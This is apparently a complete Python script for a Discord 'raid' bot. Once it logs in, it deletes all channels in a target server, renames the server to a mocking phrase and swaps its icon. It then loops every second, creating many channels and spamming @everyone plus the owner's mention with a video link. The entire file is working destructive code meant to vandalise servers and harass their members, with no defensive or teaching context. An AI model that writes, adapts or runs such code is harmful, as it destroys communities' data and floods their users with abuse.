import discord
import aiohttp
import asyncio
from io import BytesIO
from discord.ext import commands, tasks

TOKEN = 'BOT TOKEN HERE'
GUILD_ID = GUILD ID HERE  #GUILD ID HERE

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot is ready! Logged in as {bot.user}')

    guild = bot.get_guild(GUILD_ID)
    if guild:
        for channel in guild.channels:
            await channel.delete()
        for channel in guild.channels:
            await channel.delete()
        for channel in guild.channels:
            await channel.delete()
        await guild.edit(name="Imagine getting raided clown")

        with open("images/clown.jpg", "rb") as icon_file:
            icon = icon_file.read()
            await guild.edit(icon=icon)
            message_task.start(guild) 

@tasks.loop(seconds=1)  # Repeat every second
async def message_task(guild):
    channel_name = 'NEVER-BACK-DOWN'  # Replace with your desired channel name

    # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention}https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    await channel.send(f'@everyone {owner.mention}https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
      # Create channel
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')
    channel = await guild.create_text_channel(channel_name)
    print(f'Created channel: #{channel.name}')
    owner= guild.owner
    await channel.send(f'@everyone {owner.mention} https://cdn.discordapp.com/attachments/1132829496840572969/1133491304433713262/Warriet_Memee.mp4')

    await asyncio.sleep(1)

@message_task.before_loop
async def before_message_task():
    await bot.wait_until_ready()


bot.run(TOKEN)
